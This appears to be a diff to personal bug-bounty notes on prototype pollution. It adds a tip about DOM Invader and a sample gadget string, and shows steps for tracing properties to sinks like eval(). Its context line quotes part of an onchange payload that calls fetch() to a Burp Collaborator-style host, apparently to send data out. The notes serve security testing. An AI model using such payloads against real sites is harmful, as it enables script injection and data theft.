@@ -287,6 +287,7 @@ onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.bur
     16. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as innerHTML or eval().
     17. Repeat this process for any properties that you think are potential gadgets.
   - https://gowthams.gitbook.io/bughunter-handbook/list-of-vulnerabilities-bugs/prototype-pollution
+  - DOM invador is the way to go, makes life much easier, note: sometimes extra chars like `1` is being appended like this`if(manager && manager.sequence){ manager.macro(ar2z0fxj6prototypepollutionsequencear2z0fxj1) }` so add `-` in the end to ignore the 1.
 ### SSRF
  - places to look for
    - When a full URL is used in a parameter in the address bar:
